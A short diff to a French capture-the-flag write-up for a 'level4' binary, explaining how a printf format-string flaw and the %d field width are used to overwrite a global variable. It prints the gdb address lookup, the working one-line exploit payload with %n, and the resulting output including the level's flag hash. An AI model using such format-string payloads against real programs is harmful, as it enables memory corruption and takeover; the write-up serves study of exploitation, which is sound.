@@ -1,7 +1,10 @@
-On va se servir de la meme faille de securite que l'exercice precedent.
+On va se servir de la meme faille de securite que l'exercice precedent. Sauf qu'ici pour ecrire le nombre de caractere demandé
+on va ce servir de la taille de champs du %d de printf
 
 addresse de m
 (gdb) x 0x8049810
 0x8049810 <m>:	0x00000000
 
 cat <(python -c 'print("\x10\x98\x04\x08" + "%16930112d" + "%12$n")') - | ./level4
+                                         -1208015184
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
